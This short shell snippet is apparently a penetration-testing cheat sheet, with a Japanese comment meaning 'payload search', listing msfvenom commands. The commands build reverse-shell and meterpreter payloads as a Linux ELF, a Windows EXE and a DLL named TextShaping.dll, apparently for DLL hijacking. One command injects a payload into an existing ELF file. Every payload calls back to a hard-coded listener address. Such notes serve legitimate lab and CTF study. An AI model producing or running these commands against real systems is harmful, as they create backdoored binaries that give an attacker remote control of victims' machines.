```sh
# ペイロード検索
msfvenom -l payloads --platform windows --arch x64

msfvenom -p linux/shell_reverse_tcp lhost=192.168.0.1 lport=31337 -f elf -o exploit.elf

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.109.203 lport=1234 -f exe -o exploit.exe

msfvenom -x <existing-elf-file> -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f elf -o injected.elf

msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.189 lport=1234 -f dll -o TextShaping.dll
```